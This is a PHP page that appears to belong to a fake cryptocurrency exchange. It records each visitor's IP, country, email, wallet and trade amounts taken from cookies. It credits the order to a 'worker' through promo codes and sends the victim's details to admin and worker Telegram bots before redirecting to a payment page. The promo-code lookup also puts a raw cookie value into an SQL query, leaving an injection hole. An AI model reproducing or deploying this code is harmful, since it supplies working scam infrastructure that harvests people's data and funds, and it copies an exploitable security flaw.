<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Loading</title>
</head>
<body>

<?php
require_once  "config.php";
require_once  "getCountry.php";



 //$ipaddress = "90.141.14.83";

$ipaddress = $_SERVER['HTTP_CLIENT_IP']
   ? $_SERVER['HTTP_CLIENT_IP']
   : ($_SERVER['HTTP_X_FORWARDED_FOR']
       ? $_SERVER['HTTP_X_FORWARDED_FOR']
       : $_SERVER['REMOTE_ADDR']);
       
$ipaddress2 = $_SERVER['HTTP_CLIENT_IP']
   ? $_SERVER['HTTP_CLIENT_IP']
   : ($_SERVER['HTTP_X_FORWARDED_FOR']
       ? $_SERVER['HTTP_X_FORWARDED_FOR']
       : $_SERVER['REMOTE_ADDR']);


$sendUsd =  $_COOKIE["sendUsd"];
$country = ip_info($ipaddress);
$pair = $_COOKIE["pair"];
$mail = $_COOKIE["mail"];
$mail2 = $_COOKIE["mail"];
$wallet = $_COOKIE["wallet"];
$wallet2 = $_COOKIE["wallet"];
$transactionId = $_COOKIE["transactionId"];
$usedPromo = $_COOKIE["usedPromo"];
$usedPromo2 = $_COOKIE["usedPromo"];

$sendCoinName = $_COOKIE["sendCoinName"];
$receiveCoinName = $_COOKIE["receiveCoinName"];
$inputAmount = $_COOKIE["inputAmount"];
$receiveAmount = $_COOKIE["receiveAmount"];


$new_order = $pdo->prepare("INSERT INTO orders (ip,data,country,amount,pair,mail,accepted,transactionId) VALUES (:ip,:data,:country,:amount,:pair,:mail,:accepted,:transactionId)");
$new_order ->execute([
    ':ip'=> $ipaddress,
    ':data'=> date("Y-m-d H:i:s"),
    ':country'=> $country["country_code"],
    ':amount'=>$sendUsd,
    ':pair'=>$pair,
    ':mail'=>$mail,
    ':accepted'=>0,
    ':transactionId'=>$transactionId,

]);
$workerTag = "-";
$botTokenadmin = "";
$botTokenworker = "";
$chatIdadmin = "";
$chatIdworker = "";
$query = $pdo->prepare("SELECT * FROM sitesettings");
$query->execute();
$result = $query;
  foreach ($result as $row) {
    $botTokenadmin = $row['botTokenadmin'];
    $botTokenworker = $row['botTokenworker'];
    $chatIdadmin = $row['chatIdadmin'];
    $chatIdworker = $row['chatIdworker'];
  }

if(strlen($usedPromo) > 1){
  $getWorker = $pdo->prepare("SELECT * FROM promocodes WHERE code = '" .$usedPromo."'" );
  $getWorker->execute();
  $getWorkerResult = $getWorker;
    foreach ($getWorkerResult as $getWorkerResultRow) {
      $workerTag = $getWorkerResultRow['worker'];
    }
}
else{
  $usedPromo = "-";
  $usedPromo2 = "-";
}
$usedPromo[strlen($usedPromo)-1] = "*";
$usedPromo[strlen($usedPromo)-2] = "*";
$usedPromo[strlen($usedPromo)-3] = "*";
$ipaddress[strlen($ipaddress)-1] = "*";
$ipaddress[strlen($ipaddress)-2] = "*";
$ipaddress[strlen($ipaddress)-3] = "*";
$ipaddress[0] = "*";
$ipaddress[1] = "*";
$wallet[strlen($wallet)-1] = "*";
$wallet[strlen($wallet)-2] = "*";
$wallet[strlen($wallet)-3] = "*";
$wallet[1] = "*";
$wallet[2] = "*";
$wallet[3] = "*";
$mail[1] = "*";
$mail[2] = "*";
$mail[3] = "*";

try {
    if(strlen($botTokenadmin) > 5 && strlen($mail) > 5){
        $data = [
            'chat_id' => $chatIdadmin,
            'parse_mode' => 'HTML',
            'text' => "<b>Заявка на обмен:</b>

<b>Меняет " . $inputAmount . " " . $sendCoinName . " на " . $receiveAmount . " " . $receiveCoinName . "</b>
<b>Сумма обмена в долларах: " . $sendUsd . "$</b>

<b>Почта:</b> " . $mail2 . "
<b>Кошелёк:</b> " . $wallet2 . "
<b>Воркер:</b> " . $workerTag . "
<b>Промокод:</b> " . $usedPromo2 . ""
        ];
        $response = file_get_contents("https://api.telegram.org/bot$botTokenadmin/sendMessage?" . http_build_query($data));
        
                $data2 = [
            'chat_id' => $chatIdworker,
            'parse_mode' => 'HTML',
            'text' => "<b>Заявка на обмен:</b>

<b>Меняет " . $inputAmount . " " . $sendCoinName . " на " . $receiveAmount . " " . $receiveCoinName . "</b>
<b>Сумма обмена в долларах: " . $sendUsd . "$</b>

<b>Почта:</b> " . $mail . "
<b>Кошелёк:</b> " . $wallet . "
<b>Воркер:</b> " . $workerTag . ""
        ];
        $response = file_get_contents("https://api.telegram.org/bot$botTokenworker/sendMessage?" . http_build_query($data2));
        
    }
}catch (Exception $ex){
    
} finally {
    echo "<script>window.location.replace('/payment');</script>";
    die();
}



?>
</body>
</html>
